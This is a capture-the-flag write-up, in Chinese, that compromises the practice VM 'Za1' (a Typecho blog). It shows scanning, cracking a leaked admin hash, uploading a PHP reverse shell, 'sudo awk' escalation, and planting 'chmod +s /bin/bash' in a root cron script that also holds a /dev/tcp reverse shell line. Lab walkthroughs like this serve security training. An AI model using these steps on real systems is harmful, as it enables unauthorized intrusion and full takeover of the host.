# Za1

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404142110383.png" alt="image-20240414202913983" style="zoom: 33%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404142110385.png" alt="image-20240414202926841" style="zoom:33%;" />

## 信息搜集

### 端口扫描

```bash
rustscan -a 172.20.10.9 -- -A
```

```text
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 36:32:5b:78:d0:f4:3c:9f:05:1a:a7:13:91:3e:38:c1 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCiszwYYyjXll/pr+K+GGq77l6g9Z5zhJbJpC3hth0Nm+QtBaasUz2i1/ys4WOAExSDhc+kA5BU1IpX2dWSvWsk4JWKNy9zJuHux/g3GBy9BwLusNzPTYWeUUa9iu5mwKD4Saj1mfM7BzMZggFXcyk8rFdm8Z/DiLs41TbYn38av1diBd160wnfG6uYIScqFQh/i9PUoeTMEOE7cVYSpWjbiym6Xu2l79YcP3SnMvygMVJZ8lfFI2Tr5QGYmRT3COLs00caTZ5dc8PuVbp90YAAj0UafgFcTAPtOK6ZlmffZch2oVAg4TG71fXwGoQqg7oTlBgqmrHN+pkpryZ53BBf
|   256 72:07:82:15:26:ce:13:34:e8:42:cf:da:de:e2:a7:14 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIA8M/o11TTI8tOkNw1O1Sk4AKfP35fuoc6WHuwtRGYRgWZ9JpG3qjL9qGRR+VzTxGZw1oGPPjK+5WbakGvJlm4=
|   256 fc:9c:66:46:86:60:1a:29:32:c6:1f:ec:b2:47:b8:74 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHXqZTpsGVeofSC4FHp5n/f1hV+SZR6B/Mvdviej5kRK
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: Typecho 1.2.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Zacarx's blog
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### 目录扫描

```bash
gobuster dir -u http://172.20.10.9 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,zip,git,jpg,txt,png
```

```text
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.20.10.9
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,png,php,zip,git,jpg
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 276]
/index.php            (Status: 200) [Size: 6788]
/admin                (Status: 301) [Size: 310] [--> http://172.20.10.9/admin/]
/install              (Status: 301) [Size: 312] [--> http://172.20.10.9/install/]
/install.php          (Status: 302) [Size: 0] [--> http://172.20.10.9/]
/sql                  (Status: 301) [Size: 308] [--> http://172.20.10.9/sql/]
/LICENSE.txt          (Status: 200) [Size: 14974]
/var                  (Status: 301) [Size: 308] [--> http://172.20.10.9/var/]
/usr                  (Status: 301) [Size: 308] [--> http://172.20.10.9/usr/]
/.php                 (Status: 403) [Size: 276]
/server-status        (Status: 403) [Size: 276]
Progress: 1543920 / 1543927 (100.00%)
===============================================================
Finished
===============================================================
```

### 漏洞扫描

```bash
nikto -h http://172.20.10.9
```

```text
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          172.20.10.9
+ Target Hostname:    172.20.10.9
+ Target Port:        80
+ Start Time:         2024-04-14 08:31:16 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /admin/login.php?action=insert&username=test&password=test: phpAuction may allow user admin accounts to be inserted without proper authentication. Attempt to log in with user 'test' password 'test' to verify. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0995
+ /install/: Directory indexing found.
+ /install/: This might be interesting.
+ /sql/: Directory indexing found.
+ /LICENSE.txt: License file found may identify site software.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /admin/login.php: Admin login page/section found.
+ /var/: Directory indexing found.
+ /var/: /var directory has indexing enabled.
+ 8102 requests: 0 error(s) and 13 item(s) reported on remote host
+ End Time:           2024-04-14 08:32:00 (GMT-4) (44 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

## 漏洞发现

### 踩点

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404142110386.png" alt="image-20240414203212148" style="zoom:50%;" />

好家伙，顺手查一下漏洞吧：

```bash
┌──(kali💀kali)-[~/temp/Za_1]
└─$ searchsploit typecho 1.2.1          
Exploits: No Results
Shellcodes: No Results
```

果然不是这方面的。

### 敏感目录

```apl
http://172.20.10.9/admin
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404142110387.png" alt="image-20240414203350805" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404142110388.png" alt="image-20240414203433881" style="zoom: 33%;" />

### 查看数据库

下载一下，打开看一下，文本打开发现，最前面有`SQLite format 3`：

```bash
┌──(kali💀kali)-[~/temp/Za_1]
└─$ wget http://172.20.10.9/sql/new.sql                                                       
--2024-04-14 08:38:56--  http://172.20.10.9/sql/new.sql
Connecting to 172.20.10.9:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 102400 (100K) [application/x-sql]
Saving to: ‘new.sql’

new.sql                               100%[=================================================>] 100.00K  --.-KB/s    in 0.001s  

2024-04-14 08:38:56 (98.1 MB/s) - ‘new.sql’ saved [102400/102400]

┌──(kali💀kali)-[~/temp/Za_1]
└─$ wget http://172.20.10.9/sql/sercet.sql
--2024-04-14 08:39:04--  http://172.20.10.9/sql/sercet.sql
Connecting to 172.20.10.9:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 102400 (100K) [application/x-sql]
Saving to: ‘sercet.sql’

sercet.sql                            100%[=================================================>] 100.00K  --.-KB/s    in 0s      

2024-04-14 08:39:04 (423 MB/s) - ‘sercet.sql’ saved [102400/102400]

┌──(kali💀kali)-[~/temp/Za_1]
└─$ head new.sql                                                           
��pite f'���Typechohttps://typecho.org127.0.0.1Typecho 1.2.1欢迎加入 Typecho 大家族commentapproved
��
��      d���
�       �       ��
                  �
                   �e�H'�'             爱生命startd��d���<!--markdown-->我不去想，
是否能够成功 ，
既然选择了远方 ，
便只顾风雨兼程。

┌──(kali💀kali)-[~/temp/Za_1]
└─$ sqlite3 new.sql          
SQLite version 3.44.2 2023-11-24 11:41:44
Enter ".help" for usage hints.
sqlite> .tables;
Error: unknown command or invalid arguments:  "tables;". Enter ".help" for help
sqlite> .tables
typechocomments       typechometas          typechousers        
typechocontents       typechooptions      
typechofields         typechorelationships
sqlite> select * from typechousers
   ...> ;
1|zacarx|$P$BhtuFbhEVoGBElFj8n2HXUwtq5qiMR.|zacarx@qq.com|http://www.zacarx.com|zacarx|1690361071|1692694072|1690364323|administrator|9ceb10d83b32879076c132c6b6712318
2|admin|$P$BERw7FPX6NWOVdTHpxON5aaj8VGMFs0|admin@11.com||admin|1690364171|1690365357|1690364540|administrator|5664b205a3c088256fdc807791061a18
```

### 爆破

尝试爆破一下：

```bash
┌──(kali💀kali)-[~/temp/Za_1]
└─$ echo '$P$BhtuFbhEVoGBElFj8n2HXUwtq5qiMR.' > zacarx_hash       

┌──(kali💀kali)-[~/temp/Za_1]
└─$ echo '$P$BERw7FPX6NWOVdTHpxON5aaj8VGMFs0' > admin      

┌──(kali💀kali)-[~/temp/Za_1]
└─$ john zacarx_hash -w=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:38 6.63% (ETA: 08:52:59) 0g/s 28358p/s 28358c/s 28358C/s 5121246003..50dgirl
Session aborted

┌──(kali💀kali)-[~/temp/Za_1]
└─$ john admin -w=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
123456           (?)     
1g 0:00:00:00 DONE (2024-04-14 08:44) 25.00g/s 4800p/s 4800c/s 4800C/s 123456..november
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session completed.
```

### 登录上传反弹shell

尝试登录，居然是弱密码。。。。灯下黑了。。。

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404142110389.png" alt="image-20240414204527951" style="zoom:50%;" />

![image-20240414204637000](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404142110390.png)

居然还做了解析。。。。

修改上传设置上传反弹shell！

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404142110391.png" alt="image-20240414204802421" style="zoom:50%;" />

先添加一下dns解析：

```apl
172.20.10.9    za1.hmv
```

保存一下，然后尝试上传：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404142110392.png" alt="image-20240414204926144" style="zoom:50%;" />

```bash
http://za1.hmv/usr/uploads/revershell.php
```

发布文章了，触发一下，实测发现修改以后弹不出来，可能是我操作有问题：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404142110393.png" alt="image-20240414205510604" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404142110394.png" alt="image-20240414205523728" style="zoom:33%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404142110395.png" alt="image-20240414205536932" style="zoom:50%;" />

## 提权

### 信息搜集

```bash
(remote) www-data@za_1:/$ ls
bin   cdrom  etc   initrd.img      lib    lost+found  mnt  proc  run   snap  swap.img  tmp  var      vmlinuz.old
boot  dev    home  initrd.img.old  lib64  media       opt  root  sbin  srv   sys       usr  vmlinuz
(remote) www-data@za_1:/$ cd /home
(remote) www-data@za_1:/home$ ls
za_1
(remote) www-data@za_1:/home$ cd za_1/
(remote) www-data@za_1:/home/za_1$ ls
user.txt
(remote) www-data@za_1:/home/za_1$ ls -la
total 44
drwxr-xr-x 6 za_1 za_1 4096 Aug 22  2023 .
drwxr-xr-x 3 root root 4096 Jul 26  2023 ..
lrwxrwxrwx 1 za_1 za_1    9 Aug 22  2023 .bash_history -> /dev/null
-rw-r--r-- 1 za_1 za_1  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 za_1 za_1 3771 Apr  4  2018 .bashrc
drwx------ 2 za_1 za_1 4096 Jul 26  2023 .cache
drwx------ 3 za_1 za_1 4096 Jul 26  2023 .gnupg
-rw-r--r-- 1 za_1 za_1  807 Apr  4  2018 .profile
drwxr-xr-x 2 za_1 za_1 4096 Jul 26  2023 .root
drwx------ 2 za_1 za_1 4096 Jul 26  2023 .ssh
-rw-r--r-- 1 za_1 za_1    0 Jul 26  2023 .sudo_as_admin_successful
-rw------- 1 za_1 za_1  991 Jul 26  2023 .viminfo
-rw-r--r-- 1 za_1 za_1   23 Jul 26  2023 user.txt
(remote) www-data@za_1:/home/za_1$ sudo -l
Matching Defaults entries for www-data on za_1:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on za_1:
    (za_1) NOPASSWD: /usr/bin/awk
```

### awk提权

参考https://gtfobins.github.io/gtfobins/awk/

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404142110396.png" alt="image-20240414205823241" style="zoom:50%;" />

```bash
(remote) www-data@za_1:/home/za_1$ sudo -u za_1 awk 'BEGIN {system("/bin/bash")}'
za_1@za_1:~$ whoami;id
za_1
uid=1000(za_1) gid=1000(za_1) groups=1000(za_1),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
za_1@za_1:~$ pwd
/home/za_1
za_1@za_1:~$ ls -la
total 44
drwxr-xr-x 6 za_1 za_1 4096 Aug 22  2023 .
drwxr-xr-x 3 root root 4096 Jul 26  2023 ..
lrwxrwxrwx 1 za_1 za_1    9 Aug 22  2023 .bash_history -> /dev/null
-rw-r--r-- 1 za_1 za_1  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 za_1 za_1 3771 Apr  4  2018 .bashrc
drwx------ 2 za_1 za_1 4096 Jul 26  2023 .cache
drwx------ 3 za_1 za_1 4096 Jul 26  2023 .gnupg
-rw-r--r-- 1 za_1 za_1  807 Apr  4  2018 .profile
drwxr-xr-x 2 za_1 za_1 4096 Jul 26  2023 .root
drwx------ 2 za_1 za_1 4096 Jul 26  2023 .ssh
-rw-r--r-- 1 za_1 za_1    0 Jul 26  2023 .sudo_as_admin_successful
-rw------- 1 za_1 za_1  991 Jul 26  2023 .viminfo
-rw-r--r-- 1 za_1 za_1   23 Jul 26  2023 user.txt
za_1@za_1:~$ cat user.txt
flag{ThursD0y_v_wo_50}
```

### 提权至root

```bash
za_1@za_1:~$ sudo -l
[sudo] password for za_1: 
za_1@za_1:~$ find / -perm -u=s -type f 2>/dev/null
/bin/mount
/bin/umount
/bin/fusermount
/bin/su
/bin/ping
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/at
/usr/bin/traceroute6.iputils
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgidmap
/usr/bin/chfn
/usr/bin/newuidmap
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/chsh
za_1@za_1:~$ file /bin/fusermount
/bin/fusermount: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=3bfc1d4dff4f52bd8df25fd11a2c1b5812e2d71c, stripped
za_1@za_1:~$ ls -la
total 44
drwxr-xr-x 6 za_1 za_1 4096 Aug 22  2023 .
drwxr-xr-x 3 root root 4096 Jul 26  2023 ..
lrwxrwxrwx 1 za_1 za_1    9 Aug 22  2023 .bash_history -> /dev/null
-rw-r--r-- 1 za_1 za_1  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 za_1 za_1 3771 Apr  4  2018 .bashrc
drwx------ 2 za_1 za_1 4096 Jul 26  2023 .cache
drwx------ 3 za_1 za_1 4096 Jul 26  2023 .gnupg
-rw-r--r-- 1 za_1 za_1  807 Apr  4  2018 .profile
drwxr-xr-x 2 za_1 za_1 4096 Jul 26  2023 .root
drwx------ 2 za_1 za_1 4096 Jul 26  2023 .ssh
-rw-r--r-- 1 za_1 za_1    0 Jul 26  2023 .sudo_as_admin_successful
-rw------- 1 za_1 za_1  991 Jul 26  2023 .viminfo
-rw-r--r-- 1 za_1 za_1   23 Jul 26  2023 user.txt
za_1@za_1:~$ cd .root
za_1@za_1:~/.root$ ls -la
total 12
drwxr-xr-x 2 za_1 za_1 4096 Jul 26  2023 .
drwxr-xr-x 6 za_1 za_1 4096 Aug 22  2023 ..
-rwxrwxrwx 1 root root  117 Jul 26  2023 back.sh
za_1@za_1:~/.root$ cat back.sh 
#!/bin/bash
cp /var/www/html/usr/64c0dcaf26f51.db /var/www/html/sql/new.sql
bash -i >&/dev/tcp/10.0.2.18/999 0>&1
za_1@za_1:~/.root$ ls -l /bin/bash
-rwxr-xr-x 1 root root 1113504 Apr 18  2022 /bin/bash   
za_1@za_1:~/.root$ vim back.sh 
za_1@za_1:~/.root$ head back.sh 
#!/bin/bash
cp /var/www/html/usr/64c0dcaf26f51.db /var/www/html/sql/new.sql
bash -i >&/dev/tcp/10.0.2.18/999 0>&1
chmod +s /bin/bash
```

不知道是否是定时任务，但是既然权限这么高，且有读写权限，先写入再说，传一个`pspy64`上去瞅瞅：

```bash
(local) pwncat$ lpwd
/home/kali/temp/Za_1
(local) pwncat$ lcd ..
(local) pwncat$                                                                                                                                         
(remote) za_1@za_1:/home/za_1/.root$ cd /tmp
(remote) za_1@za_1:/tmp$ 
(local) pwncat$ upload pspy64
./pspy64 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 4.5/4.5 MB • 3.6 MB/s • 0:00:00[09:04:13] uploaded 4.47MiB in 1.71 seconds                                                                                                 upload.py:76
(local) pwncat$                                                                                                                                         
(remote) za_1@za_1:/tmp$ chmod +x pspy64 
(remote) za_1@za_1:/tmp$ ./pspy64 
Segmentation fault
```

我用这个软件是因为方便，当然使用python或者nc也可以传输！

额，这是什么个情况。。。我也尝试传了小一点的但还是报错了。。。。

看一下是否添加了`suid`权限：

```bash
(remote) za_1@za_1:/tmp$ ls -l /bin/bash
-rwsr-sr-x 1 root root 1113504 Apr 18  2022 /bin/bash
(remote) za_1@za_1:/tmp$ bash -p
(remote) root@za_1:/tmp# whoami;id
root
uid=1000(za_1) gid=1000(za_1) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),1000(za_1)
(remote) root@za_1:/tmp# cd /root
(remote) root@za_1:/root# ls -la
total 60
drwx------  6 root root 4096 Aug 22  2023 .
drwxr-xr-x 24 root root 4096 Jul 26  2023 ..
lrwxrwxrwx  1 root root    9 Aug 22  2023 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  2 root root 4096 Aug 22  2023 .cache
drwx------  3 root root 4096 Aug 22  2023 .gnupg
drwxr-xr-x  3 root root 4096 Jul 26  2023 .local
-rw-------  1 root root  154 Jul 26  2023 .mysql_history
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   75 Jul 26  2023 .selected_editor
-rw-------  1 root root  137 Aug 22  2023 .sqlite_history
drwx------  2 root root 4096 Jul 26  2023 .ssh
-rw-------  1 root root 9983 Jul 26  2023 .viminfo
-rw-r--r--  1 root root   25 Jul 26  2023 root.txt
(remote) root@za_1:/root# cat root.txt 
flag{qq_group_169232653}
```

看来是定时任务，拿到root了。。。。。

